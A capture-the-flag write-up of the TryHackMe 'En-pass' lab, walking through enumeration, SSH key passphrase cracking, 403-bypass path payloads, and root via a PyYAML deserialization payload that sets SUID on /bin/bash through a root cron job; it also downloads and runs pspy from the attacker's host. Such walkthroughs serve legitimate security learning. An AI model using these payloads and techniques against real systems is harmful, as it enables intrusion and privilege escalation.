# En-pass

## Introduction

Welcome to my another writeup! In this TryHackMe [En-pass](https://tryhackme.com/room/enpass) room, you'll learn: Bypassing 403 forbidden, exploiting insecure deserialization and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

> Get what you can't.

> Difficulty: Medium

---

Think-out-of-the-box

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# export RHOSTS=10.10.153.216
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8abf6b1e93717c990459d38d8104af46 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCicax/djwvuiP5H2ET5UJCYL3Kp7ukHPJ0YWsSBUc6o8O/wwzOkz82yJRrZAff40NmLEpbvf0Sxw2JhrtoxDmdj+FSHpV/xDUG/nRE0FU10wDB75fYP4VFKR8QbzwDu6fxkgkZ3SAWZ9R1MgjN3B49hywgwqMRNtw+z2r2rXeF56y1FFKotBtK1wA223dJ8BLE+lRkAZd4nOr5HFMwrO+kWgYzfYJgSQ+5LEH4E/X7vWGqjdBIHSoYOUvzGJJmCum2/MOQPoDw5B85Naw/aMQqsv7WM1mnTA34Z2eTO23HCKku5+Snf5amqVwHv8AfOFub0SS7AVfbIyP9fwv1psbP
|   256 40fd0cfc0ba8f52db12e3481e5c7a591 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBENyLKEyFWN1XPyR2L1nyEK5QiqJAZTV2ntHTCZqMtXKkjsDM5H7KPJ5EcYg5Rp1zPzaDZxBmPP0pDF1Rhko7sw=
|   256 7b3997f06c8aba385f487bccda72a844 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJmb0JdTeq8kjq+30Ztv/xe3wY49Jhc60LHfPd5yGiRx
8001/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: En-Pass
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.2p2 Ubuntu
8001              | Apache httpd 2.4.18 ((Ubuntu))

### HTTP on port 8001

**Adding a new host to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# echo "$RHOSTS enpass.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231224944.png)

**Some weird text?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231225004.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231225022.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231225031.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231225311.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# echo 'U2FkCg==' | base64 -d
Sad
```

Nothing weird.

**Let's enumerate hidden directories and files via `gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# gobuster dir -u http://enpass.thm:8001/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
/web                  (Status: 301) [Size: 313] [--> http://enpass.thm:8001/web/]
/zip                  (Status: 301) [Size: 313] [--> http://enpass.thm:8001/zip/]
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# gobuster dir -u http://enpass.thm:8001/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 
[...]
/index.html           (Status: 200) [Size: 2563]
[...]
/reg.php              (Status: 200) [Size: 2417]
[...]
/3.jpg                (Status: 200) [Size: 1220897]
/403.php              (Status: 403) [Size: 1123]
```

- Found hidden directories: `/web`, `/zip`
- Found hidden files: `/reg.php`, `/403.php`

**`/web`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231225853.png)

**HTTP status `403 Forbidden`. Let's enumerate this directory again:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# gobuster dir -u http://enpass.thm:8001/web/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,txt,bak
[...]
/resources            (Status: 301) [Size: 323] [--> http://enpass.thm:8001/web/resources/]
```

- Found hidden directory in `/web`: `/resources` 

**`/web/resources/`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# curl http://enpass.thm:8001/web/resources/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at enpass.thm Port 8001</address>
</body></html>
```

Again 403.

**Let's use `feroxbuster` to enumerate it recursively:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# feroxbuster -u http://enpass.thm:8001/web/resources -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 -o ferox.txt 
[...]
301      GET        9l       28w      323c http://enpass.thm:8001/web/resources => http://enpass.thm:8001/web/resources/
301      GET        9l       28w      332c http://enpass.thm:8001/web/resources/infoseek => http://enpass.thm:8001/web/resources/infoseek/
301      GET        9l       28w      342c http://enpass.thm:8001/web/resources/infoseek/configure => http://enpass.thm:8001/web/resources/infoseek/configure/
403      GET        9l       28w      277c http://enpass.thm:8001/web/resources/infoseek/
301      GET        9l       28w      342c http://enpass.thm:8001/web/resources/infoseek/configure => http://enpass.thm:8001/web/resources/infoseek/configure/
200      GET       30l       37w     1766c http://enpass.thm:8001/web/resources/infoseek/configure/key
```

- Found hidden directories and file: `/web/resources/infoseek/configure/key`

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# curl http://enpass.thm:8001/web/resources/infoseek/configure/key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,3A3DBCAED659E70F7293FA98DB8C1802

V0Z7T9g2JZvMMhiZ6JzYWaWo8hubQhVIu3AcrxJZqFD0o2FW1K0bHGLbK8P+SaAc
{Redacted}
-----END RSA PRIVATE KEY-----
```

It's a private SSH key, and it has a passphrase.

**Let's crack that via `john`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# curl http://enpass.thm:8001/web/resources/infoseek/configure/key -o key

┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# chmod 600 key

┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# ssh2john key > key.john

┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt key.john
[...]
0g 0:00:00:05 DONE (2022-12-31 23:16) 0g/s 2502Kp/s 2502Kc/s 2502KC/sa6_123..*7¡Vamos!
Session completed.
```

Hmm... Unable to crack.

**`/zip`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231230010.png)

**Bunch of zip files. Let's download all of them via `wget`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# wget -r http://enpass.thm:8001/zip/
[...]

┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# cd enpass.thm:8001;ls -lah
total 6.1M
drwxr-xr-x 4 root root 4.0K Dec 31 23:01 .
drwxr-xr-x 4 root root 4.0K Dec 31 23:00 ..
-rw-r--r-- 1 root root 1.2M Jan 31  2021 3.jpg
drwxr-xr-x 2 root root 4.0K Dec 31 23:00 icons
-rw-r--r-- 1 root root 2.6K Jan 31  2021 index.html
-rw-r--r-- 1 root root 4.3M Jan 31  2021 patan2.jpg
-rw-r--r-- 1 root root 618K Jan 31  2021 patan.jpg
drwxr-xr-x 2 root root 4.0K Dec 31 23:01 zip
```

**Then, unzip all zip files via Bash for loop:**
```
┌──(root🌸siunam)-[~/…/thm/ctf/En-pass/enpass.thm:8001]
└─# cd zip

┌──(root🌸siunam)-[~/…/ctf/En-pass/enpass.thm:8001/zip]
└─# mkdir unziped
                                                                                                           
┌──(root🌸siunam)-[~/…/ctf/En-pass/enpass.thm:8001/zip]
└─# for number in {0..100};do echo 'y' | unzip -d unziped a$number.zip && cat unziped/a;done
Archive:  a0.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a1.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a2.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a3.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a4.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a5.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a6.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a7.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
Archive:  a8.zip
replace unziped/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped/a               
sadman
[...]
```

`sadman`? No clue what is it.

**How about the `a.zip`?**
```
┌──(root🌸siunam)-[~/…/ctf/En-pass/enpass.thm:8001/zip]
└─# rm unziped/a

┌──(root🌸siunam)-[~/…/ctf/En-pass/enpass.thm:8001/zip]
└─# unzip -d unziped a.zip 
Archive:  a.zip
 extracting: unziped/a0.zip          
 extracting: unziped/a50.zip         
 extracting: unziped/a100.zip
 
┌──(root🌸siunam)-[~/…/ctf/En-pass/enpass.thm:8001/zip]
└─# cd unziped
```

```
┌──(root🌸siunam)-[~/…/En-pass/enpass.thm:8001/zip/unziped]
└─# mkdir unziped1

┌──(root🌸siunam)-[~/…/En-pass/enpass.thm:8001/zip/unziped]
└─# for number in 0 50 100;do echo 'y' | unzip -d unziped1 a$number.zip && cat unziped1/a;done 
Archive:  a0.zip
replace unziped1/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped1/a              
sadman
Archive:  a50.zip
replace unziped1/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped1/a              
sadman
Archive:  a100.zip
replace unziped1/a? [y]es, [n]o, [A]ll, [N]one, [r]ename:  extracting: unziped1/a              
sadman
```

Hmm... Rabbit hole?

**`/reg.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020221231232710.png)

**View source page:**
```php
<h4 style='color:rgb(83, 21, 165);'> <?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          $val = explode(",",$title);
          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }
          }

          if ( ($sum) == 9 ){
              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";
            }
                    else{
                      echo "  Try Try!!";
                    }
          }
          else{
            echo "  Try Again!! ";
          }     
  }
?>
</h4>
```

Hmm... **Looks like we need the `$sum` is equal to `9`.**

**Let's break it down:**

- Check the HTTP method is POST
- `$title` = POST parameter
- Check the `$title` does NOT contain alphanumeric characters
- `$val` = spliting our `$title` value into an array via `,` delimiter
- Check if the string length of array `0` is 2 AND string length of array `8` is 3, then:
    - Check if string array `5` is NOT equal to string array `8` AND string array `3` is NOT equal to string array `7`, then:
        - `$sum` `+=` boolean value of string arrays
- If `$sum` is equal to `9`, then we can get the `$result`

**To solve this, I'll write a PHP code:**
```php
<?php 
    $val = explode(",", "!!,!,!@,!@#,!@#$,!@#$%,!@#$%^,!@#$%^&,!!!");
    $sum = 0;

    for($i = 0 ; $i < 9; $i++){
                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {
                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
                        $sum = $sum+ (bool)$val[$i]; 
                }
          }

    echo "Sum = ${sum}";
?>
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# php test.php
Sum = 9
```

So `!!,!,!@,!@#,!@#$,!@#$%,!@#$%^,!@#$%^&,!!!` is the correct input.

**Let's try that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020230101000328.png)

Boom! We got the password!

## Initial Foothold

**Armed with above information, let's use that password to crack the SSH private key's passphrase:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# echo '{Redacted}' > password.txt                                   
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# john --wordlist=password.txt key.john 
[...]
{Redacted} (key)
```

It's indeed correct!

Now, we have the private key. But which user belongs to that key?

**Let's brute force username!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# searchsploit openssh 7.2
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                             | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                       | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                      | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection              | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                 | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Dom | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading             | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                 | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                | linux/remote/40113.txt
--------------------------------------------------------------------- ---------------------------------

┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# searchsploit -m 45939
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# python2 45939.py $RHOSTS test  
/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography.hazmat.backends import default_backend
[+] test is a valid username
```

Hmm... False positive?

Do you remember we still have one thing we need to check?

**`/403.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020230101004013.png)

Let's try to bypass this 403.

**According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses#http-headers-fuzzing), we can use different HTTP headers try to bypass 403:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020230101005307.png)

However, I tried all of them, no luck.

**Alright, let's try [`4-ZERO-3`](https://github.com/Dheerajmadhukar/4-ZERO-3) to fuzz that:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# /opt/4-ZERO-3/403-bypass.sh -u http://enpass.thm:8001/403.php --exploit
[...]
Payload [ /..//..;/ ]: Status: 404, Length : 274 
Payload [ /../;/ ]: Status: 404, Length : 274 
Payload [ /../;/../ ]: Status: 200, Length : 2563  👌
╭─────────────────────────────────────────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://enpass.thm:8001/403.php/../;/../' -H 'User-Agent: Mozilla/5.0'
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────╯
Payload [ /..;%2f ]: Status: 404, Length : 274 
Payload [ /..;%2f..;%2f ]: Status: 404, Length : 274 
Payload [ /..;%2f..;%2f..;%2f ]: Status: 404, Length : 274 
Payload [ /..;/../ ]: Status: 403, Length : 1123 
Payload [ /..;/..;/ ]: Status: 403, Length : 1123 
Payload [ /..;// ]: Status: 403, Length : 1123 
Payload [ /..;//../ ]: Status: 200, Length : 917  👌
╭─────────────────────────────────────────────────────────────────────────────────────────────────────────╮
 ╰─> PAYLOAD : curl -k -s 'http://enpass.thm:8001/403.php/..;//../' -H 'User-Agent: Mozilla/5.0'
╰─────────────────────────────────────────────────────────────────────────────────────────────────────────╯
Payload [ /..;//..;/ ]: Status: 403, Length : 1123 
[...]
```

**Looks like payload `/..;//../` bypassed the 403!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020230101011759.png)

`Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.`

- Found system user: `imsau`

**Let's SSH into `imsau` with the SSH key!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# ssh -i key imsau@$RHOSTS 
Enter passphrase for key 'key': 
[...]
$ /bin/bash
imsau@enpass:~$ whoami;hostname;id;ip a
imsau
enpass
uid=1002(imsau) gid=1002(imsau) groups=1002(imsau)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:23:68:4f:7f:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.10.46.142/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::23:68ff:fe4f:7fc9/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `imsau`!

**user.txt:**
```
imsau@enpass:~$ cat user.txt
{Redacted}
```

## Privilege Escalation

### imsau to root

Let's do some enumerations!

**SUID binaries:**
```
imsau@enpass:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
/bin/ping6
```

Nothing weird.

**Capability**
```
imsau@enpass:~$ getcap -r / 2>/dev/null
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
```

**Check `/opt`:**
```
imsau@enpass:~$ ls -lah /opt
total 12K
drwxr-xr-x  3 root root 4.0K Jan 31  2021 .
drwxr-xr-x 23 root root 4.0K Jan  1 05:47 ..
drwxr-xr-x  2 root root 4.0K Jan 31  2021 scripts
```

Found `scripts` directory.

**`/opt/scripts`:**
```
imsau@enpass:~$ ls -lah /opt/scripts/
total 12K
drwxr-xr-x 2 root root 4.0K Jan 31  2021 .
drwxr-xr-x 3 root root 4.0K Jan 31  2021 ..
-r-xr-xr-x 1 root root  250 Jan 31  2021 file.py
```

**`/opt/scripts/file.py`:**
```py
#!/usr/bin/python
import yaml


class Execute():
	def __init__(self,file_name ="/tmp/file.yml"):
		self.file_name = file_name
		self.read_file = open(file_name ,"r")

	def run(self):
		return self.read_file.read()

data  = yaml.load(Execute().run())
```

What this python script does is **reading a YAML file from `/tmp/file.yml`, then parse the data to `yaml`'s `load()` method.**

**`pspy`:** 
```
┌──(root🌸siunam)-[/opt/pspy]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
imsau@enpass:~$ wget http://10.9.0.253/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy

imsau@enpass:~$ /tmp/pspy
[...]
2023/01/01 07:04:01 CMD: UID=0    PID=1577   | /usr/sbin/CRON -f 
2023/01/01 07:04:01 CMD: UID=0    PID=1576   | /usr/sbin/CRON -f 
2023/01/01 07:04:01 CMD: UID=0    PID=1579   | 
2023/01/01 07:04:01 CMD: UID=0    PID=1578   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2023/01/01 07:04:01 CMD: UID=0    PID=1581   | 
2023/01/01 07:04:01 CMD: UID=0    PID=1580   | 
2023/01/01 07:04:01 CMD: UID=0    PID=1582   | 
2023/01/01 07:04:02 CMD: UID=0    PID=1583   | sudo chown root:root /tmp/file.yml 
2023/01/01 07:04:02 CMD: UID=0    PID=1584   | /usr/bin/python /opt/scripts/file.py 
[...]
2023/01/01 07:05:01 CMD: UID=0    PID=1589   | /usr/sbin/CRON -f 
2023/01/01 07:05:01 CMD: UID=0    PID=1588   | /bin/sh -c cd /tmp && sudo chown root:root /tmp/file.yml 
2023/01/01 07:05:01 CMD: UID=0    PID=1587   | /usr/sbin/CRON -f 
2023/01/01 07:05:01 CMD: UID=0    PID=1586   | /usr/sbin/CRON -f 
2023/01/01 07:05:01 CMD: UID=0    PID=1590   | /bin/sh -c cd /opt/scripts && sudo /usr/bin/python /opt/scripts/file.py && sudo rm -f /tmp/file.yml 
2023/01/01 07:05:01 CMD: UID=0    PID=1591   | sudo chown root:root /tmp/file.yml 
2023/01/01 07:05:02 CMD: UID=0    PID=1592   | chown root:root /tmp/file.yml 
2023/01/01 07:05:02 CMD: UID=0    PID=1593   | sudo /usr/bin/python /opt/scripts/file.py 
[...]
```

Hmm... Looks like there is an interesting cronjob:

- Every 1 minute, a cronjob will be ran, which will change the `/tmp/file.yml` permission to `root`. **Then run `/opt/scripts/file.py` as root and remove `/tmp/file.yml`.**

Now, how can we abuse this?

According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization), we can use python Yaml library to exploit **insecure deserialization**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020230101013726.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/En-pass/images/Pasted%20image%2020230101013732.png)

**Let's use [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) to generate our payload:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# python3 /opt/python-deserialization-attack-payload-generator/peas.py   
Enter RCE command :chmod +s /bin/bash
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :N
Enter File location and name to save :./file
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :PyYAML
Done Saving file !!!!
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/En-pass]
└─# cat file_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - chmod
  - +s
  - /bin/bash
```

This payload will add a SUID sticky bit to `/bin/bash`, so we can spawn a Bash shell with SUID privilege (root).

**Let's create a `backup.yml` file in `/tmp`!**
```yaml
imsau@enpass:~$ nano /tmp/backup.yml
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - chmod
  - +s
  - /bin/bash
```

**Then use an inifite loop to copy the file to `/tmp/file.yml`:**
```
imsau@enpass:~$ while true;do cp /tmp/backup.yml /tmp/file.yml 2>/dev/null;done
```

**Finally, verify the `/bin/bash` has SUID sticky bit:**
```
imsau@enpass:~$ ls -lah /bin/bash
-rwsr-sr-x 1 root root 1014K Jul 12  2019 /bin/bash
```

**It worked! Let's spawn a root Bash shell:**
```
imsau@enpass:~$ /bin/bash -p
bash-4.3# whoami;hostname;id;ip a
root
enpass
uid=1002(imsau) gid=1002(imsau) euid=0(root) egid=0(root) groups=0(root),1002(imsau)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:ae:2e:91:51:3b brd ff:ff:ff:ff:ff:ff
    inet 10.10.199.231/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::ae:2eff:fe91:513b/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```
bash-4.3# cat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating Hidden Directories & Files via `gobuster`
2. Cracking Private SSH Key Passphrase
3. Bypassing HTTP Status 403 Forbidden 
4. Vertical Privilege Escalation via Exploiting Insecure Deserialization in Python's YAML Library